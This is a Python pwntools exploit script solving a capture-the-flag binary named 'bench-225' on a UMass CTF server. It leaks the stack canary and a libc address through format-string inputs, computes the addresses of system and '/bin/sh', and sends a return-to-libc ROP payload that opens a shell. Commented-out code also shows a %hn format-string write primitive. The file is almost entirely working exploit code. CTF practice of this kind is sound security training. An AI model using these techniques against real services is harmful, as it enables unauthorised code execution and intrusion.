from pwn import *
import time
context.log_level = 'debug'
context.arch = "amd64"

import argparse
import sys
# if len(sys.argv) > 1:
    # first_arg = int(sys.argv[1])
    
e = context.binary = ELF('bench-225')
r= e.process()
lib = e.libc

r = remote('bench-225.ctf.umasscybersec.org',  1337)
# path_lib= ['libc6_2.35-0ubuntu3.4_amd64.so','libc6_2.35-0ubuntu3.5_amd64.so', 'libc6_2.12.1-0ubuntu10.4_amd64.so']
# ld = ELF('ld-linux-x86-64.so.2')
# path = path_lib[first_arg]
# lib= ELF(path)

# import subprocess
# def one_gadget(filename):
  # return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]
  
list_binsh =[330311, 965761, 965765, 965768]
    
print(list_binsh)

# pause()
for i in range(5):
    sleep(0.1)
    r.sendline(b"3")
for i in range(6):
    sleep(0.1)
    r.sendline(b"4")
r.sendline(b"6")
# gdb.attach(r, f"b*motivation+167\n si")
# pause()
r.sendlineafter(b"Enter your motivational quote: ", b"%13$p")
r.recvuntil(b'Quote: "0x')
canary = int(r.recv(16), 16)

for i in range(57-16):
    r.recvline()
r.sendline(b"6")
# gdb.attach(r, f"b*motivation+167\n si")
pause()
r.sendlineafter(b"Enter your motivational quote: ", b"%35$p")
r.recvuntil(b'Quote: "0x')
__libc_start_main = int(r.recv(12), 16)-128

for i in range(57-16):
    r.recvline()
log.info("canary: %#x" %canary)
log.info("__libc_start_main: %#x" %__libc_start_main)

base_libc = __libc_start_main-lib.sym.__libc_start_main-0x3000
system_libc = base_libc +lib.sym.system+0x3000
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))+0x3000
pop_rdi_ret =lib.sym.iconv+197+base_libc+0x3000
ret = pop_rdi_ret+1
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)
log.info("pop_rdi_ret: %#x" %pop_rdi_ret)



r.sendline(b"6")
# gdb.attach(r, f"b*motivation+167\n si")
payload = flat(b"a"*8, canary, ret, ret,pop_rdi_ret,binsh_libc,system_libc )
pause()
r.sendlineafter(b"Enter your motivational quote: ", payload)

# def write_addr(value, retn):
    # for i in range(3):
        # time.sleep(0.5)
        # r.sendline(b"6")
        # payload= (f"%{value&0xffff}c%8$hn".encode()).ljust(8,b"a")+flat(canary, retn)
        # time.sleep(0.5)
        # r.sendlineafter(b"Enter your motivational quote: ", payload )
        # print(payload)
        # value = value>>16
        # retn+=2
        
# write_addr(ret, retn)
# retn+=8
# write_addr(pop_rdi_ret, retn)
# retn+=8
# write_addr(binsh_libc, retn)
# retn+=8
# write_addr(system_libc, retn)

# r.sendline(b"3")
r.interactive()
# gdb.attach(r, f"b*motivation+167\n si")
# pause()